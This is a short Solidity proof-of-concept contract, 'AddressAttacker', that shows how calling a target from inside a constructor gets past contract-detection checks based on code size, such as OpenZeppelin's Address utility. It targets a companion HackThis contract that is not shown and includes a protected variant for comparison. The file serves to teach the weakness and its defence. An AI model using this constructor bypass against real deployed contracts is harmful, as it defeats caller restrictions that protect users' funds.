// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "@openzeppelin/contracts/utils/Address.sol";

import "./HackThis.sol";

// Author: @dm4th

/**
 * @dev Collection of Contracts to demoonstrate the constructor vulnerability in Openzepplin's Address util constructor
 */

interface IHackThis {
    function attemptHack() external returns(bool);
    function protectedAttemptHack() external returns(bool);
}

contract AddressAttacker {
    /**
    * @dev this is the contract we'll use to exploit the vulnerability in the openzepplin adress contract
    */

    using Address for address;
    bool public hacked;

    /**
     * @dev all of the exploits occur in the constructor to take advantage of the 
     * extcodebytesize == 0 aspect of contracts in the constructor
     * - hackThisAddr is the address of the HackThis contract we're using as a proof of concept
     * - succeed is a boolean to pick which function we'l call on HackThis
     *      - If True we'll run attemptHack() which will be a successful attack
     *      - If False we'll run protectedAttemptHack() which demonstrates how to protect against this hack
     */
    constructor(address hackThisAddr, bool succeed) { 
        if (succeed) {
            hacked = IHackThis(hackThisAddr).attemptHack();
        }
        else {
            hacked = IHackThis(hackThisAddr).protectedAttemptHack();
        }
     }
}